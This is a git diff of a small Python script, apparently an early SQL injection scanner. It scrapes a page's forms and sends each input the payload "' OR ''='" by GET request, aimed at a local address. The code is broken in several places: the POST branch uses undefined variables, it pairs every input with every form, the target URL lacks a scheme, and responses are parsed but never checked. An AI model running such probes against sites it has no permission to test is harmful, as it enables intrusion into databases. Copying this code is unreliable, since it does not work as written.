@@ -4,20 +4,37 @@ import requests
 import re
 
 errors = [
-    "' OR ''='"
+    "' OR ''='",
+    "query"
 ]
 
-def get(url):
-    page = requests.get(url)
-    soup = BeautifulSoup(page.text, "html.parser")
-    for form in soup.select('form'):
+s = requests.Session()
 
-        print(str(form['id']))
-        print(str(form['method']))
-        print(str(form['action']))
+def get(url):
+    page = s.get(url)
+    soup = BeautifulSoup(page.text, "html.parser")
+    for forms in soup.select('form'):
 
         for inputs in soup.select('input'):
-            print(str(inputs['name']))
+
+            if str(forms['method']) == "get":
+                print("[SQL] >> GET REQUEST - " + str(forms['action'] + "?" + str(inputs['name']) + "=" + errors[1]))
+
+                # Checks if action is the base URL.
+                if str(forms['action']).startswith("http://") or str(forms['action']).startswith("https://"):
+                    for error in errors:
+                        r = s.get(str(forms['action'] + "?" + str(inputs['name']) + "=" + error))
+                        output = BeautifulSoup(r.text, "html.parser")
+                else:
+                    for error in errors:
+                        r = s.get(url + str(forms['action'] + "?" + str(inputs['name']) + "=" + error))
+                        output = BeautifulSoup(r.text, "html.parser")
+
+            elif str(form['method']) == "post":
+                s.post(str(forms['action']), data=formdata)
+
+            else:
+                print("[SQL] >> Method for Form: " + str(forms['id']) + " could not be found?")
         
 
 get("127.0.0.1:8080")
